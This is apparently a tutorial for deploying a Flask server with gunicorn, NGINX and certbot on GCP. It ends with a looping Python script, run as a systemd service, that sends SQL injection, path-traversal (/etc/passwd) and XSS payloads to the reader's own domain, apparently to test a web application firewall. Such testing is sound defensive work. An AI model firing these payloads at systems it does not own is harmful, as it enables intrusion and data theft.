# How to deploy a flask server with NGINX on GCP 

This tutorial provides a step by step guide on how to deploy your flask server on GCP and generate web traffic to it.

## Prerequisites
1. Make sure the server is running on your local machine: 
```sh
$ python3 -m venv .venv
$ source .venv/bin/activate
$ pip3 install -r requirements.txt 

# After running the following command, 
# the server should be accessible on http://localhost:5000
$ python3 main.py
```
2. Make sure you have an existing project on GCP with billing enabled

## STEP1: Create a VPS (Virtual Private Server) 

- Create a linux compute instance on GCP and make sure you allow `HTTPS` and `HTTPS` traffic on it
- Reserve a static external IP to your instance
- Install the `gcloud` client on your terminal: https://cloud.google.com/sdk/docs/install
- Set up your account and choose the right project: `$ gcloud init`
- Finally, SSH to your instance: `$ gcloud compute ssh YOUR_INSTANCE_NAME --zone=YOUR_ZONE`

The next step will be to send the source code to the remote server. This process can be done via `scp` or by zipping the whole folder `flask-server` and uploading it to a public bucket for that sake (`R2`, `S3` or `Cloud Storage`)
You can run the following commands to update your OS and download the code:
```sh
$ sudo apt-get update
$ sudo apt-get install ufw
$ sudo apt install unzip

$ wget https://URL_OF_YOUR_REMOTE_OBJECT_STORE/flask-server.zip
$ unzip flask-server.zip

# Alternatively, you can use this:
$ wget https://vse-test-servers.s3.eu-west-2.amazonaws.com/eu-ec2-server.zip
$ unzip eu-ec2-server.zip
```

## STEP2: Install Python and setup the environment

```sh
$ sudo apt-get install python3 python3-pip

$ sudo apt install python3.11-venv

$ cd flask-server
$ python3 -m venv .venv
$ source .venv/bin/activate
$ pip3 install -r requirements.txt 
```

## STEP3: Install NGINX and test the server
You can install NGINX by running the following commands
```sh
$ sudo apt install nginx
$ sudo systemctl enable nginx
$ sudo systemctl start nginx
```

Create a `wsgi.py` file (`$ nano wsgi.py`) and paste the following snippet:
```python
from main import app

if __name__ == "__main__":
    app.run(debug=False)
```

Test your server
```sh
# After running the following command, 
# the server should be accessible on http://YOUR_EXTERNAL_IP:5000
$ gunicorn --bind 0.0.0.0:5000 wsgi:app
```

Now exit the virtual environment:  `$ deactivate`

Create a `flask-server.service` file (`$ sudo nano /etc/systemd/system/flask-server.service`) and paste the following snippet
Don't forget  to change `YOUR_USERNAME` with the username on your remote machine
```sh
[Unit]
Description=Gunicorn instance to serve eu-ec2-server
After=network.target

[Service]
User=YOUR_USERNAME
Group=www-data
WorkingDirectory=/home/YOUR_USERNAME/flask-server
Environment="PATH=/home/YOUR_USERNAME/flask-server/.venv/bin"
ExecStart=/home/YOUR_USERNAME/flask-server/.venv/bin/gunicorn --workers 3 --bind unix:flask-server.sock -m 007 wsgi:app

[Install]
WantedBy=multi-user.target
```

Reload the daemon and start your new `flask-server` service
```sh
$ sudo systemctl daemon-reload
$ sudo systemctl start flask-server
$ sudo systemctl enable flask-server
$ sudo systemctl status flask-server
```

Create a `flask-server` nginx configuration (`$ sudo nano /etc/nginx/sites-available/flask-server`) and paste the following snippet
Don't forget to change `YOUR_USERNAME` , `YOUR_DOMAIN` and `YOUR_EXTERNAL_IP`
```sh
server {
    listen 80;
    server_name YOUR_DOMAIN *.YOUR_DOMAIN YOUR_EXTERNAL_IP;
    # Set Cache-Control header for all paths
    add_header Cache-Control "public, max-age=86400";

    location / {
        include proxy_params;
        proxy_pass http://unix:/home/YOUR_USERNAME/flask-server/flask-server.sock;

        # Set Cache-Control header for all paths
        add_header Cache-Control "public, max-age=86400";
    }
}
```

Note that there is a `add_header Cache-Control "public, max-age=86400";` command to allow a CDN to eventually cache your static assets

Reload NGINX with your new server's configuration
```sh
$ sudo ln -s /etc/nginx/sites-available/flask-server /etc/nginx/sites-enabled
$ sudo nginx -t
$ sudo systemctl restart nginx
$ sudo ufw delete allow 5000
$ sudo ufw allow 'Nginx Full'
$ sudo chmod 755 /home/YOUR_USERNAME
```

🚀 Your server should now be accessible via `http:YOUR_DOMAIN` or `http:YOUR_EXTERNAL_IP`

## STEP4: Request a SSL certificate for your domain server
```sh
$ sudo apt install python3-certbot-nginx
$ sudo certbot --nginx -d demo-cf.net -d www.demo-cf.net
$ sudo ufw delete allow 'Nginx HTTP'
```


## STEP5: Generate continuous malicious traffic to your server
Log in via ssh to your traffic generator server and create a `waf_attack.py` file (`$ nano waf_attack.py`) and paste the following snippet:
```python
import requests
import os
import time

site_to_attack = "http://YOUR_DOMAIN"

sql_attack = "?**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/usersame/**/LIKE/**/%27tom"
rce_attack = "?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd"
xss_attack = "?globalHtml=%3Csvg%20on%20onContextMenu=alert(1337)%3E"

images = "/images"
videos = "/videos"
articles = "/articles"
iteration = 2

def executeSqlAttack():
    attackUrl1 = site_to_attack + sql_attack
    attackUrl2 = site_to_attack + images
    attackUrl3 = site_to_attack + videos
    attackUrl4 = site_to_attack + articles

    for i in range (0,iteration):
        session = requests.Session()
        r = session.get(attackUrl1)
        r = session.get(attackUrl2)
        r = session.get(attackUrl3)
        r = session.get(attackUrl4)

def executeRceAttack():
    attackUrl1 = site_to_attack + rce_attack
    attackUrl2 = site_to_attack + images
    attackUrl3 = site_to_attack + videos
    attackUrl4 = site_to_attack + articles

    for i in range (0,iteration):
        session = requests.Session()
        r = session.get(attackUrl1)
        r = session.get(attackUrl2)
        r = session.get(attackUrl3)
        r = session.get(attackUrl4)


def executeXssAttack():
    attackUrl1 = site_to_attack  + xss_attack
    attackUrl2 = site_to_attack + images
    attackUrl3 = site_to_attack + videos
    attackUrl4 = site_to_attack + articles

    for i in range (0,iteration):
        session = requests.Session()
        r = session.get(attackUrl1)
        r = session.get(attackUrl2)
        r = session.get(attackUrl3)
        r = session.get(attackUrl4)

while True:
    executeSqlAttack()
    time.sleep(30)
    executeXssAttack()
    time.sleep(30)
    executeRceAttack()
    time.sleep(500)
```

Create a `waf_service.service` file (`$ sudo nano /etc/systemd/system/waf_service.service`) and paste the following snippet
Don't forget  to change `YOUR_USERNAME` with the username on your remote machine
```sh
[Unit]
Description=My Python Script
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /home/YOUR_USERNAME/waf_attack.py
Restart=always

[Install]
WantedBy=multi-user.target
```


Reload the daemon and start your new `waf_service` service
```sh
$ sudo systemctl daemon-reload
$ sudo systemctl start waf_service
$ sudo systemctl enable waf_service
$ sudo systemctl status waf_service
```
